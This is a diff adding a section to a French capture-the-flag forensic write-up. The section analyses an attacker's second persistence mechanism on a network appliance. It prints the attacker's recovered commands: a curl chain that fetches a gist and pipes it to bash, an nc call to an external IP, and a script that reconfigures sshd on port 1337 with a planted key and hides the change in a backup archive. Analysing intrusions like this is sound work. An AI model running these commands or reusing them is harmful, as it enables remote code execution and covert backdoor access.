@@ -146,6 +146,32 @@ echo FCSC{REDACTED}
 > Vous cherchez les caractéristiques de cette seconde persistance : protocole utilisé, port utilisé, chemin vers le fichier de configuration qui a été modifié, chemin vers le fichier qui a été modifié afin d'établir la persistance.
 
 > Le flag est au format : FCSC{\<protocole\>:\<port\>:\<chemin_absolu\>:\<chemin_absolu\>}.
+
+En continuant de déchiffrer chaque occurence, on obtient ensuite : 
+```bash
+/home/bin/curl -k -s https://api.github.com/repos/joke-finished/2e18773e7735910db0e1ad9fc2a100a4/commits?per_page=50 -o /tmp/a'
+cat /tmp/a | grep "name" | /pkg/uniq | cut -d ":" -f 2 | cut -d \'"\' -f 2 | tr -d \'\n\' | grep -o . | tac | tr -d \'\n\'  > /tmp/b
+a=`cat /tmp/b`;b=${a:4:32};c="https://api.github.com/gists/${b}";/home/bin/curl -k -s ${c} | grep \'raw_url\' | cut -d \'"\' -f 4 > /tmp/c
+c=`cat /tmp/c`;/home/bin/curl -k ${c} -s | bash
+rm /tmp/a /tmp/b /tmp/c
+nc 146.0.228.66:1337
+```
+
+Après désobfuscation, les commandes exécutent en réalité script suivant :
+```bash
+sed -i 's/port 830/port 1337/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
+sed -i 's/ForceCommand/#ForceCommand/' /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
+echo "PubkeyAuthentication yes" >> /data/runtime/etc/ssh/sshd_server_config
+echo "AuthorizedKeysFile /data/runtime/etc/ssh/ssh_host_rsa_key.pub" >> /data/runtime/etc/ssh/sshd_server_config
+pkill sshd-ive > /dev/null 2>&1
+gzip -d /data/pkg/data-backup.tgz > /dev/null 2>&1
+tar -rf /data/pkg/data-backup.tar /data/runtime/etc/ssh/sshd_server_config > /dev/null 2>&1
+gzip /data/pkg/data-backup.tar > /dev/null 2>&1
+mv /data/pkg/data-backup.tar.gz /data/pkg/data-backup.tgz > /dev/null 2>&1
+```
+
+Nous avons donc tout ce qu'il est nécessaire de connaître : le port (1337), le protocole (SSH), le fichier de config (sshd_server_config) et le fichier modifié pour la persistance (data-backup.tgz).
+
 ## Partie 5/5
 > Vous avez presque fini votre analyse ! Il ne vous reste plus qu'à qualifier l'adresse IP présente dans la dernière commande utilisée par l'attaquant.
 
